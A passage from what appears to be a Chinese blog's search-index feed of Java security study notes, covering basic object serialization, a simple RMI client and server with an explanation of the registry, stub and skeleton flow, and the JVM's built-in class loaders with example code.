id="ObjectInputStream和ObjectOutputStream示例"><a href="#ObjectInputStream和ObjectOutputStream示例" class="headerlink" title="*ObjectInputStream和ObjectOutputStream示例"></a>*ObjectInputStream和ObjectOutputStream示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ObjectxxxSteam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 搞出一个对象 * * * * * */</span></span><br><span class="line">            <span class="type">DeserializationTest</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeserializationTest</span>();</span><br><span class="line">            t.name = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">            t.email = <span class="string">&quot;abc@apt&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * *  * * * ObjectOutputStream写出内存: 序列化 * * * * * */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 字节数组输出流：ByteArrayOutputStream 是一个输出流，用于将数据写入内存中的字节数组</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="comment">// 对象与数据类型输出流：ObjectOutputStream 是一个用于写入对象和基本数据类型的输出流</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            <span class="comment">// Object输出流的关闭和缓冲需要进行注意</span></span><br><span class="line">            oos.writeObject(t);</span><br><span class="line">            oos.close();</span><br><span class="line">            oos.flush();</span><br><span class="line">            System.out.println(<span class="string">&quot;DeserializationTest序列化后端字节数组&quot;</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * ObjectInputSream写入内存:反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 原理和输出流类似的</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 字节数组输入流：需要接受一个别的输出，而输出流每一次创建都是新的</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="comment">// 对象输入流</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">DeserializationTest</span> <span class="variable">newT</span> <span class="operator">=</span> (DeserializationTest) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;用户名: &quot;</span> + newT.name + <span class="string">&quot; 邮箱: &quot;</span> + newT.email);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 指向不同的对象 * * * * * */</span></span><br><span class="line">            System.out.println(t);</span><br><span class="line">            System.out.println(newT);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://javaguide.cn/java/basis/serialization.html#jdk-%E8%87%AA%E5%B8%A6%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B9%E5%BC%8F">jdk-自带的序列化方式与serialVersionUID</a></li><li>补充参考，比较细节，还没看完<ol><li><a href="https://www.zhihu.com/question/37562657/answer/1916596031">知乎讨论区</a></li><li><a href="https://cryin.github.io/blog/secure-development-java-deserialization-vulnerability/">应用安全:JAVA反序列化漏洞之殇</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全4_RMI</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A84_RMI/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A84_RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="引入RMI-Remote-Method-Invocation"><a href="#引入RMI-Remote-Method-Invocation" class="headerlink" title="引入RMI(Remote Method Invocation)"></a>引入RMI(Remote Method Invocation)</h2><blockquote><p>RMI严重依赖序列化和反序列化<br>使用RMI时，双方必须是内网互相信任的机器，不要把1099端口暴露在公网上作为对外服务<br>Java的RMI调用机制决定了双方必须是Java程序，其他语言很难调用Java的RMI。如果要使用不同语言进行RPC调用，可以选择更通用的协议，例如gRPC</p></blockquote><ol><li>Java远程方法调用，RMI用于构建分布式应用程序，RMI实现了Java程序之间跨JVM的远程通信：<strong>实现了方法调用和对象实体的独立</strong>，一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法 –&gt; <strong>RMI的方法执行是再服务端上进行的，只是将结果返回给客户端并且可以有客户端进行调用</strong></li><li>RMI是Java独有的一种机制</li></ol><h2 id="二话不说先手搓熟悉一下"><a href="#二话不说先手搓熟悉一下" class="headerlink" title="二话不说先手搓熟悉一下"></a>二话不说先手搓熟悉一下</h2><blockquote><p>大体先理解一下然后再进入细节</p></blockquote><ol><li>实现注意事项<ol><li>客户端只需要查找服务并获得接口实例，服务器端只需要编写实现类并注册为服务</li><li><em><strong>接口</strong></em>: <strong>服务端和客户端中的接口类必须一样</strong>，客户端只要有接口类就可以，对象是从远程服务端进行加载的，与此同时，<strong>接口必须必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException</strong>，客户端提供接口并进行远程调用</li><li><em><strong>服务端</strong></em>: 服务端需要将对应服务类的实例<strong>注册到rmi服务中</strong>(对应就是<code>Naming.bind(RMI_SERVER_NAME, new RMITest());</code>)，这里注册的是实例而不是类</li><li>Index<ol><li>RMIClientTest</li><li>RMIServerTest</li></ol></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIClientTest</span></span><br><span class="line">    <span class="comment">// 本来客户端也要有IRMITest这个接口，但是在本机不能冲突</span></span><br><span class="line">    <span class="comment">// 如果冲突会报错: </span></span><br><span class="line">    <span class="comment">// java.lang.ClassCastException: com.sun.proxy.$Proxy0 cannot be cast to RMI.RMIClient.IRMITest at RMI.RMIClient.RMIClientTest.main(RMIClientTest.java:13)</span></span><br><span class="line">    <span class="comment">// 解决方法详见https://stackoverflow.com/questions/54848952/java-rmi-class-com-sun-proxy-proxy0-cannot-be-cast-to-class-client-messageserve</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIClient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> RMI.RMIServer.IRMITest;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClientTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_SERVER_NAME</span> <span class="operator">=</span> <span class="string">&quot;rmi://192.168.193.126:7777/Test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">IRMITest</span> <span class="variable">test</span> <span class="operator">=</span> (IRMITest) Naming.lookup(RMI_SERVER_NAME);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> test.test();</span><br><span class="line">            System.out.println(res);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIServerTest</span></span><br><span class="line"><span class="comment">// 1. IRMITest</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RMI测试接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRMITest</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * RMI测试方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. RMITest</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMITest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRMITest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMITest</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * RMI测试方法实现</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回测试字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello RMI&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. RMIServerTest</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_HOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RMI_PORT</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_SERVER_NAME</span> <span class="operator">=</span> <span class="string">&quot;rmi://&quot;</span> + RMI_HOST + <span class="string">&quot;:&quot;</span> + RMI_PORT + <span class="string">&quot;/Test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// System.setProperty(&quot;java.rmi.server.hostname&quot;, RMI_HOST);</span></span><br><span class="line">            LocateRegistry.createRegistry(RMI_PORT);</span><br><span class="line">            Naming.bind(RMI_SERVER_NAME, <span class="keyword">new</span> <span class="title class_">RMITest</span>());</span><br><span class="line">            System.out.println(<span class="string">&quot;RMI服务启动成功，服务地址: &quot;</span> + RMI_SERVER_NAME);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RMI通信过程与本质"><a href="#RMI通信过程与本质" class="headerlink" title="RMI通信过程与本质"></a>RMI通信过程与本质</h2><h3 id="从宏观理解方面的通信过程"><a href="#从宏观理解方面的通信过程" class="headerlink" title="从宏观理解方面的通信过程"></a>从宏观理解方面的通信过程</h3><ol><li>先运行服务器，再运行客户端，服务端提供服务，客户端获得的接口方法返回值(实际上是通过网络从服务器端获取的)</li><li>客户端持有的WorldClock接口实际上对应了一个“实现类”，它是由Registry内部动态生成的，并负责把方法调用通过网络传递到服务器端，客户端的“实现类”称为stub</li><li>服务器端接收网络调用的服务并不是我们自己编写的WorldClockService，而是Registry自动生成的代码，服务器端的网络服务类称为skeleton，它会真正调用服务器端的WorldClockService</li><li>获取结果，然后把结果通过网络传递给客户端</li><li>整个过程由RMI底层负责实现序列化和反序列化</li><li><img src="/pic/Java%E5%AE%89%E5%85%A84_RMI/MACRO_Flow.png" alt="图示"></li></ol><h3 id="深入一点"><a href="#深入一点" class="headerlink" title="深入一点"></a>深入一点</h3><ol><li><p><img src="/pic/Java%E5%AE%89%E5%85%A84_RMI/DEEPER_Flow.png" alt="上图片"></p></li><li><p>根据p牛的java安全漫谈再次进行分析</p><blockquote><p>p牛原文<br>第⼀次建立TCP连接是连接远端 192.168.135.142 的1099端⼝，这也是我们在代码⾥里里看到的端⼝，二者进行沟通后，我向远端发送了了⼀一个“Call”消息，远端回复了了一“ReturnData”消息，然后我新建了一个TCP连接，连到远端的33769端⼝<br>在“ReturnData”这个包中，返回了目标的IP地址 192.168.135.142 ，其后跟的一个字节 \x00\x00\x83\xE9 ，刚好就是整数 33769 的⽹网络序列<br>首先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回一个序列列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是一个远程对象，地址在 192.168.135.142:33769 ，于是再与这个地址建立TCP连接；在这个新的连接中，才执行真正远程方法调⽤用，也就是 hello()</p></blockquote></li><li><p>此处进行了<em><strong>两次tcp握手</strong></em></p><ol><li><strong>第一次握手</strong>是传输RemoteCall对象，含方法调用的所有必要信息，如方法名、参数等</li><li><strong>第二次握手</strong>是通过远程对象的引用来调用远程方法并从服务端返回方法执行结果</li></ol></li></ol><blockquote><ol><li>客户端: RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)</li><li>客户端: Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象</li><li>客户端: RemoteCall序列化RMI服务名称、Remote对象</li><li>客户端到服务端: RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式传输到RMI服务端的远程引用层</li><li>服务端: RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</li><li>服务端: Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化</li><li>服务端到客户端: Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端</li><li>客户端: RMI客户端反序列化服务端结果，获取远程对象的引用</li><li>客户端到服务端: RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li><li>服务端到客户端: RMI客户端反序列化RMI远程方法调用结果</li></ol></blockquote><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="*Q&amp;A"></a>*Q&amp;A</h2><h3 id="Regiser是什么？"><a href="#Regiser是什么？" class="headerlink" title="Regiser是什么？"></a>Regiser是什么？</h3><ol><li>RMIRegistry就像一个网关，他自己是不会执行远程方法的，但RMI Server可以在上面注册一个Name到对象的绑定关系；RMI Client;通过Name向RMIRegistry查询，得到这个绑定关系，然后再连接RMIServer;最后，远程方法实际上在RMIServer上调用</li><li>再结合《深入一点》就能差不多理解了</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>javasec</li><li>java安全漫谈</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全3(1)_类加载器详解</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本节聚焦于ClassLoader这个类加载器展开</p></blockquote><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><blockquote><p>和python的类对象有一些理解上的相似之处</p></blockquote><ol><li><em><strong>简短总结</strong></em><ol><li>JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息；获取一个class对应的Class实例后，就可以<strong>获取该class的所有信息；通过Class实例获取class信息的方法称为反射（Reflection）</strong></li><li>基本类型boolean，byte，char，short，int，long，float，double和关键字void同样表现为 <strong>class 对象</strong>。数组同样也被映射为class 对象的一个类，所有具有相同元素类型和维数的数组都共享该 Class 对象</li><li>JVM总是<strong>动态加载class</strong>，可以在运行期根据条件来控制加载class</li><li>手动编写的类被编译后会产生一个Class对象，其表示的是创建的类的类型信息，而且这个Class对象保存在<strong>同名.class的文件中</strong>(字节码文件)</li><li>每个通过关键字class标识的类，<strong>在内存中有且只有一个与之对应的Class对象来描述其类型信息</strong>，无论创建多少个实例对象，其依据的都是用一个Class对象。</li><li>Class类只存私有构造函数，因此对应<strong>Class对象只能有JVM创建和加载</strong></li></ol></li><li>Class类，Class类也是一个实实在在的类，存在于JDK的java.lang包中。Class类的实例表示java应用运行时的类(class ans enum)或接口(interface and annotation)，每个java类运行时都在JVM里表现为一个class对象，可通过下列反射方法<strong>获取Class对象</strong><ol><li>类名.class</li><li>类型.getClass()</li><li>Class.forName(“类名”)。</li></ol></li></ol><h2 id="Java类的加载机制"><a href="#Java类的加载机制" class="headerlink" title="Java类的加载机制"></a>Java类的加载机制</h2><ol><li>java加载机制<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/java%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.png" alt="java加载机制"></li><li>java类加载<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.png" alt="java类加载"></li><li>Java类加载方式分为显式和隐式,显式即我们通常使用Java反射或者ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类</li></ol><h2 id="什么是ClassLoader"><a href="#什么是ClassLoader" class="headerlink" title="什么是ClassLoader"></a>什么是ClassLoader</h2><h3 id="宏观介绍"><a href="#宏观介绍" class="headerlink" title="宏观介绍"></a>宏观介绍</h3><ol><li><p>ClassLoader是一个抽象类：用于加载“字节码”到Class对象</p><ol><li><strong>数组类的ClassLoader:(来自于源码注释)</strong> 每个 Java 类都有一个引用指向加载它的 ClassLoader。不过，数组类不是通过 ClassLoader 创建的，而是 JVM 在需要的时候自动创建的，数组类通过getClassLoader()方法获取 ClassLoader 的时候和该数组的元素类型的 ClassLoader 是一致的</li><li><strong>类加载器的主要作用</strong>: 加载 Java 类的字节码（ .class 文件）到 JVM 中（在内存中生成一个代表该类的 Class 对象）。 字节码可以是 Java 源程序（.java文件）经过 javac 编译得来，也可以是通过工具动态生成或者通过网络下载得来<ol><li><strong>额外功能</strong>: 类加载器还可以加载 Java 应用所需的资源如文本、图像、配置文件、视频等等文件资源</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A class loader is an object that is responsible for loading classes. The</span></span><br><span class="line"><span class="comment"> * class &lt;tt&gt;ClassLoader&lt;/tt&gt; is an abstract class.  Given the &lt;a</span></span><br><span class="line"><span class="comment"> * href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of a class, a class loader should attempt to</span></span><br><span class="line"><span class="comment"> * locate or generate data that constitutes a definition for the class.  A</span></span><br><span class="line"><span class="comment"> * typical strategy is to transform the name into a file name and then read a</span></span><br><span class="line"><span class="comment"> * &quot;class file&quot; of that name from a file system.</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="JVM中三个重要的内置ClassLoader"><a href="#JVM中三个重要的内置ClassLoader" class="headerlink" title="JVM中三个重要的内置ClassLoader"></a>JVM中三个重要的内置ClassLoader</h3><ol><li>BootstrapClassLoader(启动类加载器)：最顶层的加载类，由 C++实现，通常表示为 null，并且没有父级，主要用来加载 JDK <strong>内部的核心类库</strong>（ %JAVA_HOME%&#x2F;lib目录下的 rt.jar、resources.jar、charsets.jar等 jar 包和类）以及被 -Xbootclasspath参数指定的路径下的所有类<ol><li><strong>Q: 为什么获取到 ClassLoader 为null就是 BootstrapClassLoader 加载的呢?</strong><ol><li>A: BootstrapClassLoader 由 C++ 实现，由于这个 C++ 实现的类加载器在 Java 中是没有与之对应的类的，所以拿到的结果是 null</li></ol></li></ol></li><li>ExtensionClassLoader(扩展类加载器)：主要负责加载 %JRE_HOME%&#x2F;lib&#x2F;ext 目录下的 jar 包和类以及被 java.ext.dirs 系统变量所指定的路径下的所有类。<strong>主要用来加载拓展类</strong></li><li>AppClassLoader(应用程序类加载器)：面向我们用户的加载器，负责加载<strong>当前应用classpath下的所有jar包和类</strong></li><li><strong>特点</strong><ol><li><p>除了 BootstrapClassLoader 是 JVM 自身的一部分之外，其他所有的类加载器都是在 JVM 外部实现的，并且全都继承自 ClassLoader抽象类</p></li><li><p>获取继承关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">printCL</span> &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> printCL.class.getClassLoader();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">split</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;|--&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ifContinue</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (ifContinue) &#123;</span><br><span class="line">            System.out.println(split.toString()+classLoader);</span><br><span class="line">            <span class="keyword">if</span> (classLoader==<span class="literal">null</span>) &#123;</span><br><span class="line">                ifContinue = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                classLoader = classLoader.getParent();</span><br><span class="line">                split.insert(<span class="number">0</span>,<span class="string">&#x27;\t&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">|--sun.misc.Launcher$AppClassLoader@500ab58d</span><br><span class="line">   